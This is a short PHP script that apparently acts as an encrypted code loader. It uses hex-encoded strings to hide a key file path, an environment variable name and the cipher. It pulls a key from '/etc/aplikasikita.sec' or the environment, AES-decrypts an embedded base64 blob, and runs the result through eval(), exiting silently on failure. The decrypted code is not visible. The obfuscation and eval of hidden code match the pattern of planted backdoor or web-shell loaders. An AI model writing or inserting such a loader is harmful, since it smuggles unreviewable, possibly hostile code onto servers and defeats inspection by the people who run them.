<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Kcdjp3b6ATZV7wq6jivSbQ==');

$c=base64_decode(

'TXqJ35ynsBZGAXCgifDkYqCkz+dd/O+dzAMqaD2opMi8VU89HIwQfeLTbneDN9GlJqGzypz7VRZY' .
'fwSSjxgmBCyen4M5PMnlTUIBlOZzEdFVcszoVa+zeQ6KlbaguTzjki5gOYv/dTUtZyLk6KWroWf7' .
'zixAmaQkcVCJSy9VmyyJeLExEQpX2LF5K3tw5OQPmCmNZcNdDZOCWxtVKos+mvLsTJWG5Hdqs3B5' .
'wYL8l+eKZAGAy5PBjqoXrF0iD4mXldmOwQCVhXo18i+1oX9FCgba/k43fuMOCTgo3OOh9/GL+vBG' .
'IYqO+9/edy5z7iX/hvtENfnbiU1PEDSOdtuIgXPIOrr5Ai0WieqnLwiM0L8WFNHN2XL7Nv+wmNPU' .
'fWe+v9QE9uniocc4GWAAQgs8AqGLXvkVGUldGILoSe9kDQVhYESCzX24yNQU3ec0dklqRnMyazbZ' .
'aDEwK9jkVizYzfMH1NxZIgQ/8DRK9P5Vkr26c6mP9ERiQsw5tPe2IN5ZhgP7GtvU7EFvGAAR/QyQ' .
'DNB6JSULF8PkInTcSabtqIs='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

